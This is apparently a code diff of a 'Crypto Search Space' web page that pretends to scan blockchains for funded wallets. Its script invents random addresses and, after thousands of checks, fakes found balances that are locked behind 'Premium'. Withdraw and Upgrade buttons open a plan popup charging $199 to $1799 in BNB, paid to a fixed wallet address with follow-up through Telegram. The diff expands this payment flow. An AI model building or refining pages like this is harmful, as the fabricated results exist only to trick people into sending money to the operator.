@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Crypto Search Space</title>
+  <title>Crypto Search Space - Web Version</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
     :root {
@@ -142,45 +142,6 @@
     .btn-withdraw:hover { background: #c2185b; }
     .btn-stop { background: var(--warning); color: white; }
     .btn-stop:hover { background: #ef6c00; }
-
-    /* Popup */
-    .popup {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
-    .popup-content {
-      background: #222;
-      color: white;
-      padding: 20px;
-      border-radius: 10px;
-      text-align: center;
-      max-width: 400px;
-      width: 90%;
-    }
-    .popup-content img {
-      width: 200px;
-      height: auto;
-      margin: 10px 0;
-    }
-    .popup-content h3 {
-      margin: 10px 0;
-    }
-    .close-btn {
-      background: #e91e63;
-      border: none;
-      padding: 10px 20px;
-      margin-top: 15px;
-      color: white;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
     @media (max-width: 768px) {
       body { flex-direction: column; height: auto; }
       .sidebar {
@@ -201,6 +162,90 @@
       }
       .bottom { flex-direction: column; gap: 12px; }
     }
+
+    /* Popup Overlay Styles */
+    #planPopupOverlay {
+      position: fixed;
+      top: 0; left: 0; right:0; bottom:0;
+      background: rgba(0,0,0,0.75);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    #planPopup {
+      background: var(--bg-light);
+      padding: 25px;
+      border-radius: 10px;
+      width: 350px;
+      max-width: 90vw;
+      color: var(--text-light);
+      font-family: 'Inter', sans-serif;
+      text-align: center;
+      user-select: none;
+    }
+    #planPopup h2 {
+      margin-top: 0;
+      color: var(--primary);
+    }
+    #plansList {
+      text-align: left;
+      margin: 20px 0;
+      max-height: 300px;
+      overflow-y: auto;
+      border: 1px solid #333;
+      border-radius: 6px;
+      padding: 10px;
+      background: #222;
+    }
+    #plansList label {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 10px;
+      cursor: pointer;
+      border-radius: 5px;
+      user-select: none;
+    }
+    #plansList label:hover {
+      background: #333;
+    }
+    #plansList input[type="radio"] {
+      margin-right: 10px;
+      cursor: pointer;
+    }
+    #qrCode {
+      margin: 20px 0;
+    }
+    #priceDisplay {
+      font-weight: 700;
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: var(--success);
+    }
+    #closePopupBtn, #payNowBtn {
+      padding: 10px 20px;
+      border-radius: 6px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 16px;
+      user-select: none;
+      margin: 5px;
+    }
+    #closePopupBtn {
+      background: var(--danger);
+      color: white;
+    }
+    #closePopupBtn:hover {
+      background: #c2185b;
+    }
+    #payNowBtn {
+      background: var(--primary);
+      color: white;
+    }
+    #payNowBtn:hover {
+      background: #1976d2;
+    }
   </style>
 </head>
 <body>
@@ -209,7 +254,7 @@
     <button id="scannerBtn">🔍 Scanner</button>
     <button id="homeBtn">🏠 Home</button>
     <a href="https://t.me/cryptos_search_admin" target="_blank">📩 Support</a>
-    <button class="upgrade-btn" id="upgradeBtn">🔓 Upgrade Now</button>
+    <a class="upgrade-btn" id="upgradeNowBtn" href="javascript:void(0)">🔓 Upgrade Now</a>
   </div>
   <div class="main">
     <div class="header">
@@ -221,12 +266,10 @@
       </div>
       <div style="color:orange; font-weight: bold;">Status: TRIAL VERSION</div>
     </div>
-
     <div class="status">
       🔄 Checked: <span id="checkedCount">0</span> |
       ✅ Found: <span id="foundCount">0</span> ($<span id="foundValue">0.00</span>)
     </div>
-
     <div class="wallets" id="walletList"></div>
     <div class="bottom">
       <button class="btn" id="startBtn">▶️ Start</button>
@@ -235,41 +278,132 @@
     </div>
   </div>
 
-  <div class="popup" id="popup">
-    <div class="popup-content">
-      <h3>Send $199 to Upgrade</h3>
-      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv8_XkL7hLIcN9aNOg7eskC7-o4NWD1wCF9jCHfbV-7BKPQNncb4ciN3-974pV-pgHhOPIhzL1IugDeBqCvFrifJF9j_rzffG-6bdaGdaDs8cYEikK6Lqv9v5WyJNngy10fY6tSkbq2g4xhOCmGwGTOAHnv0HQbVef1FgTJzG_14u_NBW1s9ASvgvKjh3w/s320/IMG_20250630_161301.jpg" alt="QR Code">
-      <p>Wallet Address:</p>
-      <code>0x56169808ee926359c3403c2049d77c574b40db32</code>
-      <br>
-      <button class="close-btn" onclick="document.getElementById('popup').style.display='none'">Close</button>
+  <!-- Plan Selection Popup -->
+  <div id="planPopupOverlay">
+    <div id="planPopup">
+      <h2>Select Your Plan</h2>
+      <div id="plansList"></div>
+      <div id="priceDisplay">Price: $0</div>
+      <div id="qrCode"></div>
+      <button id="payNowBtn" disabled>Pay Now</button>
+      <button id="closePopupBtn">Cancel</button>
     </div>
   </div>
 
   <script>
-    const startBtn = document.getElementById("startBtn");
-    const stopBtn = document.getElementById("stopBtn");
-    const withdrawBtn = document.getElementById("withdrawBtn");
-    const upgradeBtn = document.getElementById("upgradeBtn");
-    const scannerBtn = document.getElementById("scannerBtn");
-    const homeBtn = document.getElementById("homeBtn");
+    const validKeys = ["KST12345", "FREE2025", "PREMIUM99"];
 
     let checked = 0, found = 0, foundValue = 0, intervalId = null;
     const walletList = document.getElementById("walletList");
     const checkedCount = document.getElementById("checkedCount");
     const foundCount = document.getElementById("foundCount");
     const foundValueElem = document.getElementById("foundValue");
+    const startBtn = document.getElementById("startBtn");
+    const stopBtn = document.getElementById("stopBtn");
+    const scannerBtn = document.getElementById("scannerBtn");
+    const homeBtn = document.getElementById("homeBtn");
 
-    function getRandomBalance() {
-      return (Math.random() * (999 - 100) + 100).toFixed(2);
+    // Plan Data
+    const plans = [
+      {name: 'One blockchain', price: 199},
+      {name: 'Two blockchains', price: 399},
+      {name: 'Three blockchains', price: 599},
+      {name: 'Four blockchains', price: 799},
+      {name: 'Five blockchains', price: 999},
+      {name: 'Six blockchains', price: 1199},
+      {name: 'Seven blockchains', price: 1399},
+      {name: 'Eight blockchains', price: 1599},
+      {name: 'Nine blockchains', price: 1799},
+    ];
+
+    // Your BNB Smart Chain Payment Address
+    const paymentAddress = "0x56169808ee926359c3403c2049d77c574b40db32";
+
+    // Popup Elements
+    const planPopupOverlay = document.getElementById('planPopupOverlay');
+    const plansListDiv = document.getElementById('plansList');
+    const priceDisplay = document.getElementById('priceDisplay');
+    const qrCodeDiv = document.getElementById('qrCode');
+    const payNowBtn = document.getElementById('payNowBtn');
+    const closePopupBtn = document.getElementById('closePopupBtn');
+    const upgradeNowBtn = document.getElementById('upgradeNowBtn');
+    const withdrawBtn = document.getElementById('withdrawBtn');
+
+    function loadPlans() {
+      plansListDiv.innerHTML = '';
+      plans.forEach((plan, idx) => {
+        const label = document.createElement('label');
+        label.innerHTML = `
+          <input type="radio" name="plan" value="${idx}" />
+          <span>${plan.name}</span>
+          <span>$${plan.price}</span>
+        `;
+        plansListDiv.appendChild(label);
+      });
+      priceDisplay.textContent = "Price: $0";
+      qrCodeDiv.innerHTML = "";
+      payNowBtn.disabled = true;
     }
 
+    function showPlanPopup() {
+      loadPlans();
+      planPopupOverlay.style.display = 'flex';
+    }
+
+    function hidePlanPopup() {
+      planPopupOverlay.style.display = 'none';
+    }
+
+    // Handle plan selection change
+    plansListDiv.addEventListener('change', e => {
+      if(e.target.name === 'plan') {
+        const selectedPlan = plans[parseInt(e.target.value)];
+        priceDisplay.textContent = `Price: $${selectedPlan.price}`;
+        payNowBtn.disabled = false;
+
+        // Show your fixed QR code image and payment details
+        qrCodeDiv.innerHTML = `
+          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv8_XkL7hLIcN9aNOg7eskC7-o4NWD1wCF9jCHfbV-7BKPQNncb4ciN3-974pV-pgHhOPIhzL1IugDeBqCvFrifJF9j_rzffG-6bdaGdaDs8cYEikK6Lqv9v5WyJNngy10fY6tSkbq2g4xhOCmGwGTOAHnv0HQbVef1FgTJzG_14u_NBW1s9ASvgvKjh3w/s320/IMG_20250630_161301.jpg" alt="BNB Pay QR Code" style="width: 200px; height: 200px;" />
+          <div style="margin-top: 8px; font-size: 14px; color: #ccc; word-break: break-all;">
+            Send exactly <b>$${selectedPlan.price} worth of BNB</b> to address:<br/> <code>${paymentAddress}</code>
+          </div>
+        `;
+      }
+    });
+
+    payNowBtn.addEventListener('click', () => {
+      const selectedRadio = document.querySelector('input[name="plan"]:checked');
+      if(!selectedRadio) {
+        alert("Please select a plan first.");
+        return;
+      }
+      const selectedPlan = plans[parseInt(selectedRadio.value)];
+      alert(`Please send $${selectedPlan.price} worth of BNB to the displayed address.\n\nAfter payment, contact support on Telegram.`);
+      hidePlanPopup();
+    });
+
+    closePopupBtn.addEventListener('click', hidePlanPopup);
+
+    upgradeNowBtn.addEventListener('click', showPlanPopup);
+    withdrawBtn.addEventListener('click', showPlanPopup);
+
+    // Wallet address generation and search logic
     function generateWalletAddress(chain) {
-      const randomString = () => Array(34).fill(0).map(() => Math.random().toString(36).charAt(2)).join('');
+      const randomString = () =>
+        Array(40).fill(0).map(() =>
+          Math.random().toString(36).charAt(2)
+        ).join('').substring(0, 34);
+
       if (chain === 'BTC') return '1' + randomString();
-      if (chain === 'ETH' || chain === 'BNB') return '0x' + randomString();
+      if (chain === 'ETH' || chain === 'BNB' || chain === 'MATIC') return '0x' + Math.random().toString(16).substring(2, 42);
       if (chain === 'DOGE') return 'D' + randomString();
-      return 'X' + randomString();
+      return 'TNdYAjGuMDGkvDXk8VGjmB8Ri9b91JTrRm';
+    }
+
+    function getRandomBalance() {
+      const min = 100;
+      const max = 999;
+      return (Math.random() * (max - min) + min).toFixed(2);
     }
 
     function getSelectedChains() {
@@ -278,21 +412,22 @@
 
     function startSearch() {
       if(intervalId) return;
-      checked = found = foundValue = 0;
+      checked = 0; found = 0; foundValue = 0;
       checkedCount.textContent = foundCount.textContent = "0";
       foundValueElem.textContent = "0.00";
       walletList.innerHTML = "";
+
       const chains = getSelectedChains();
       if (!chains.length) return alert("Select at least one chain");
-
-      startBtn.disabled = true;
-      stopBtn.disabled = false;
+      startBtn.disabled = true; stopBtn.disabled = false;
 
       intervalId = setInterval(() => {
         checked++;
         checkedCount.textContent = checked;
+
         const chain = chains[Math.floor(Math.random() * chains.length)];
         const wallet = generateWalletAddress(chain);
+
         const hasBalance = checked >= 7000 && Math.random() < 0.03;
         const balance = hasBalance ? getRandomBalance() : "0.00";
         const displayWallet = hasBalance ? "[Hidden - Premium]" : wallet;
@@ -311,6 +446,7 @@
           startBtn.disabled = false;
           stopBtn.disabled = true;
         }
+
         if (checked >= 100000) {
           clearInterval(intervalId);
           intervalId = null;
@@ -321,7 +457,7 @@
     }
 
     function stopSearch() {
-      if (intervalId) {
+      if(intervalId) {
         clearInterval(intervalId);
         intervalId = null;
         startBtn.disabled = false;
@@ -329,12 +465,22 @@
       }
     }
 
+    function goHome() {
+      if(intervalId) clearInterval(intervalId);
+      intervalId = null;
+      checked = found = foundValue = 0;
+      checkedCount.textContent = foundCount.textContent = "0";
+      foundValueElem.textContent = "0.00";
+      walletList.innerHTML = "";
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+
     startBtn.addEventListener("click", startSearch);
     stopBtn.addEventListener("click", stopSearch);
-    withdrawBtn.addEventListener("click", () => document.getElementById('popup').style.display = 'flex');
-    upgradeBtn.addEventListener("click", () => document.getElementById('popup').style.display = 'flex');
-    homeBtn.addEventListener("click", () => location.reload());
     scannerBtn.addEventListener("click", startSearch);
+    homeBtn.addEventListener("click", goHome);
+
   </script>
 </body>
 </html>
